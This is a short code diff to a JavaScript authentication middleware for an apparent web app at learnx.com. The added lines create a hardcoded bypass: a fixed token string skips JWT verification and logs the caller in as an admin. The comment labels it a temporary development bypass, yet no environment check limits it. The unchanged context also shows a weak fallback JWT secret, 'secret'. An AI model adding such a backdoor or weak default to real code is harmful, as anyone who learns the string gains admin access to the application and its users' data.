@@ -7,6 +7,12 @@ export const authMiddleware = (req, res, next) => {
     return res.status(401).json({ error: 'Unauthorized: No token provided' });
   }
 
+  // Temporary development bypass for mock admin token
+  if (token === 'mock-jwt-admin-token-987xyz') {
+    req.user = { email: 'admin@learnx.com', role: 'admin' };
+    return next();
+  }
+
   try {
     const decoded = jwt.verify(token, process.env.JWT_SECRET || 'secret');
     req.user = decoded;
